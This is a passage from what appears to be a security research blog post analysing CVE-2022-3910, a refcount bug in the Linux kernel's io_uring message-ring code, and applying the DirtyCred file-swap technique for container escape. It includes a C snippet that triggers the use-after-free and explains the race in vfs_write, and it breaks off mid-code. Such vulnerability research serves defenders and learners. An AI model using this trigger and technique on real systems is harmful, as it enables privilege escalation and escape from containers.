<p>Fixed files, or direct descriptors, <a href="https://lwn.net/Articles/863071/">can be thought of as io_uring-specific file desciptors</a>. io_uring maintains a reference to any registered files to reduce additional overhead incurred by the resolution of file descriptors for each operation involving them; this reference is only released when the fixed files are unregistered or the io_uring instance is torn down.</p>
<p>Fixed files can be registered by passing an array of file descriptors to <code>io_uring_register()</code>. Alternatively, io_uring can be instructed to register one directly (without the userland program first having to grab a file descriptor using some other system call) using a variety of functions such as <code>io_uring_prep_openat_direct()</code>. Subsequently, these can be referenced in future SQEs by setting the <code>IOSQE_FIXED_FILE</code> flag and passing the index of the fixed file within the array of registered files instead of the actual file descriptor.</p>
<h3 id="ring-messages">Ring messages<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#ring-messages">#</a></h3>
<p>io_uring supports message passing between rings with <code>io_uring_prep_msg_ring()</code>. More specifically, according to the <a href="https://man.archlinux.org/man/extra/liburing/io_uring_prep_msg_ring.3.en">man page</a>, this operation creates a CQE in the target ring with its <code>res</code> and <code>user_data</code> set to user-specified values.</p>
<p>As noted <a href="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">here</a>, this functionality could be used to wake sleeping tasks waiting on a ring, or simply to pass arbitrary information.</p>
<h2 id="the-vulnerability">The vulnerability<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-vulnerability">#</a></h2>
<p>CVE-2022-3910 is an improper refcount update in the <code>io_msg_ring()</code> function. The source file is <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/io_uring/msg_ring.c">here</a>, but the relevant code snippet is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="kt"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">io_msg_ring</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">io_kiocb</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">req</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">issue_flags</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">io_msg</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">msg</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">=</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">io_kiocb_to_cmd</span></span></span><span class="p"><span class="hljs-class">(</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">req</span></span></span><span class="p"><span class="hljs-class">,</span></span><span class="hljs-class"> </span><span class="k"><span class="hljs-class"><span class="hljs-title">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">io_msg</span></span></span><span class="p"><span class="hljs-class">);</span></span>
</span></span><span class="line"><span class="cl">	<span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADFD</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="n">io_is_uring_fops</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">goto</span></span> <span class="n">done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">switch</span></span> <span class="p">(</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">case</span></span> <span class="nl">IORING_MSG_DATA</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">io_msg_ring_data</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">case</span></span> <span class="nl">IORING_MSG_SEND_FD</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">io_msg_send_fd</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">issue_flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">default</span></span><span class="o">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">done</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">req_set_fail</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">io_req_set_res</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="cm"><span class="hljs-comment">/* put file to avoid an attempt to IOPOLL the req */</span></span>
</span></span><span class="line"><span class="cl">	<span class="n">io_put_file</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">req</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="nb"><span class="hljs-literal">NULL</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">IOU_OK</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>A hint for the vulnerability itself can be found in the <a href="https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679">commit message for the patch</a>:</p>
<p><img loading="lazy" src="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/07-container-escape-using-file-based-DirtyCred_001.png" alt="">
</p>
<p>Ordinarily, the message passing functionality of io_uring expects a file descriptor corresponding to another io_uring instance. If we pass in a reference to anything else, it’s simply dropped with a call to <code>io_put_file()</code> and an error is returned.</p>
<p>If we pass in a fixed file, <code>io_put_file()</code> is still invoked. But this behaviour is actually incorrect! We did not grab an additional reference to the file, so we should not have decremented the refcount.</p>
<h3 id="immediate-consequences">Immediate consequences<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#immediate-consequences">#</a></h3>
<p><code>io_put_file()</code> is simply a wrapper to <code>fput()</code>. You can find its source code <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file_table.c#L374">here</a>, but the following understanding is sufficient:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="kt"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">fput</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">file</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">file</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">atomic_long_dec_and_test</span><span class="p">(</span><span class="o">&amp;</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_count</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1"><span class="hljs-comment">// free the file struct</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>In other words, by repeatedly triggering the vulnerability until the refcount drops to 0, we can free the associated <code>file</code> struct while io_uring continues to hold a reference to it. This constitutes a <strong>use-after-free</strong>.</p>
<p>Here’s some code showing how we might do so:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">io_uring</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">r</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl"><span class="n">io_uring_queue_init</span><span class="p">(</span><span class="mi"><span class="hljs-number">8</span></span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">target</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">TARGET_PATH</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo"><span class="hljs-number">0644</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"><span class="hljs-comment">// Register target file as fixed file.</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">io_uring_register_files</span><span class="p">(</span><span class="o">&amp;</span><span class="n">r</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target</span><span class="p">,</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">perror</span><span class="p">(</span><span class="s"><span class="hljs-string">"[-] io_uring_register_files"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">io_uring_sqe</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">sqe</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"><span class="hljs-comment">// Refcount is currently 2</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"><span class="hljs-comment">// (Check by by setting a breakpoint in io_msg_ring())</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k"><span class="hljs-keyword">for</span></span> <span class="p">(</span><span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">i</span><span class="o">=</span><span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi"><span class="hljs-number">2</span></span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">sqe</span> <span class="o">=</span> <span class="n">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">io_uring_prep_msg_ring</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">|=</span> <span class="n">IOSQE_FIXED_FILE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">r</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">io_uring_cqe_seen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">r</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"><span class="hljs-comment">// Refcount should now be 0, file struct should be freed.</span>
</span></span></span></code></pre></div><p>My initial attempt at an exploit made use of a bunch of cross-cache sprays and ultimately overwriting the destructor of an <code>sk_buff</code> struct (not the <code>sk_buff-&gt;data</code> allocation, as its minimum size is too large) to gain execution control.</p>
<p>This “standard” exploit is not the main focus of this post, but you can check out my code <a href="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_old_source.zip">here</a> if you are interested. I was unable to find another writeup online that made use of <code>sk_buff</code> in the same way I did, so I figured it was worth mentioning briefly.</p>
<h2 id="dirtycred">DirtyCred<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#dirtycred">#</a></h2>
<p>After I completed the abovementioned exploit, Billy encouraged me to try and write a different one making use of DirtyCred instead.</p>
<p>DirtyCred is a data-only attack that targets <code>file</code> and <code>cred</code> structs. The original slides explain the concept more clearly than I can, so if you are unfamiliar with the technique, I suggest reading <a href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">this</a> first. Of particular relevance is the section <strong>“Attacking Open File Credentials”</strong>, which is precisely what we will be using.</p>
<h3 id="the-file-struct">The <code>file</code> struct<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-file-struct">#</a></h3>
<p>As its name suggests, a <code>file</code> struct represents an open file and is allocated in the <code>filp</code> slab cache whenever a file is opened. Each <code>file</code> struct keeps track of its own refcount, which can be modified through operations such as <code>dup()</code> and <code>close()</code>. When the refcount hits zero, the struct is freed.</p>
<p>Some important members of this structure are shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">file</span></span></span><span class="hljs-class"> </span><span class="p"><span class="hljs-class">{</span></span>
</span></span><span class="line"><span class="cl">        <span class="c1"><span class="hljs-comment">// ...</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k"><span class="hljs-keyword">const</span></span> <span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">file_operations</span></span></span><span class="hljs-class">  </span><span class="o"><span class="hljs-class">*</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">f_op</span></span></span><span class="p"><span class="hljs-class">;</span></span>            <span class="cm"><span class="hljs-comment">/*    40     8 */</span></span>
</span></span><span class="line"><span class="cl">        <span class="c1"><span class="hljs-comment">// ...</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n"><span class="hljs-keyword">atomic_long_t</span></span>              <span class="n">f_count</span><span class="p">;</span>              <span class="cm"><span class="hljs-comment">/*    56     8 */</span></span>
</span></span><span class="line"><span class="cl">        <span class="c1"><span class="hljs-comment">// ...</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n"><span class="hljs-keyword">fmode_t</span></span>                    <span class="n">f_mode</span><span class="p">;</span>               <span class="cm"><span class="hljs-comment">/*    68     4 */</span></span>
</span></span><span class="line"><span class="cl">        <span class="c1"><span class="hljs-comment">// ...</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="cm"><span class="hljs-comment">/* size: 232, cachelines: 4, members: 20 */</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__aligned__</span><span class="p">(</span><span class="mi"><span class="hljs-number">8</span></span><span class="p">)));</span>
</span></span></code></pre></div><p>Let’s go over each of these briefly:</p>
<ul>
<li><code>f_op</code> is a pointer to a function table that dictates which handler is invoked when an operation is requested on the file. For example, this is <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/ext4/file.c#L913"><code>ext4_file_operations</code></a> for all files living on an ext4 filesystem.</li>
<li><code>f_count</code> stores the refcount for the <code>file</code>.</li>
<li><code>f_mode</code> stores the access mode for the <code>file</code>. This includes flags such as whether we are allowed to read from or write to it.</li>
</ul>
<blockquote>
<p>Note: when we <code>open()</code> the same file multiple times, multiple <code>file</code> structs are allocated. In comparison, when we call <code>dup()</code> on a file descriptor, the refcount of an existing <code>file</code> struct is incremented, and no new allocations are made.</p>
</blockquote>
<h3 id="code-analysis">Code analysis<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#code-analysis">#</a></h3>
<p>Now let’s try to understand how exactly DirtyCred works. Suppose we’ve opened file A with access mode <code>O_RDWR</code> and we attempt to write to it. This eventually calls <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/read_write.c#L558"><code>vfs_write()</code></a>, shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="n"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">vfs_write</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">file</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">file</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">__user</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">buf</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">size_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">count</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">loff_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">pos</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n"><span class="hljs-keyword">ssize_t</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1"><span class="hljs-comment">// Permission checks occur here</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_WRITE</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_CAN_WRITE</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">access_ok</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="n">rw_verify_area</span><span class="p">(</span><span class="n">WRITE</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">MAX_RW_COUNT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">count</span> <span class="o">=</span>  <span class="n">MAX_RW_COUNT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1"><span class="hljs-comment">// Actual write occurs down here</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">file_start_write</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">else</span></span> <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">write_iter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">new_sync_write</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">else</span></span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">fsnotify_modify</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">add_wchar</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">inc_syscw</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">file_end_write</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Suppose that, after the permission checks are done but before the actual write has begun, we managed to free file A’s <code>file</code> struct and spray a new one corresponding to a different file B, which we opened with access mode <code>O_RDONLY</code>. The access mode won’t be checked again, so the write will be performed on file B, even though we should not be allowed to do that!</p>
<p>But is it possible to consistently win this race?</p>
<h3 id="traditional-dirtycred-targeting-ext4-files">Traditional DirtyCred: targeting ext4 files<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#traditional-dirtycred-targeting-ext4-files">#</a></h3>
<p>In a typical application of DirtyCred, both files A and B reside on an ext4 filesystem. In this scenario, the write is eventually handled by <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/ext4/file.c#L255"><code>ext4_buffered_write_iter()</code></a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">ext4_buffered_write_iter</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">kiocb</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">iocb</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params">
</span></span></span></span><span class="line"><span class="cl"><span class="hljs-function"><span class="hljs-params">					</span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">iov_iter</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">from</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n"><span class="hljs-keyword">ssize_t</span></span> <span class="n">ret</span><span class="p">;</span>
